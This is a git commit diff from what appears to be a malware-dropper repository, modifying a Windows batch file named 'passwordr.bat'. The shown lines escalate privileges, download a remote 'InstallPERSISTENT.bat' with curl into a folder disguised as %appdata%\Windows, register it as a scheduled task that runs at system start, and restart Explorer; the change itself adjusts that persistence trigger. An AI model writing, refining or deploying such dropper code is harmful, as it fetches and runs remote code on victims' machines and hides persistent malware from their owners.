10609dc5ba1135c481aa38888d6d42b31c6c730d
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-05-21 16:26:48 -0400

    Update passwordr.bat

--- installs/passwordr.bat
+++ installs/passwordr.bat
@@ -11,7 +11,7 @@ if '%errorlevel%' NEQ '0' (
     del "%temp%\getadmin.vbs"
     md %appdata%\Windows
     curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/InstallPERSISTENT.bat" --output "%appdata%\Windows\Install.bat"
-    SCHTASKS /CREATE /F /SC STARTUP /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
+    SCHTASKS /CREATE /F /SC ONSTART /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
     taskkill /f /IM explorer.exe
     start explorer.exe
     exit /B
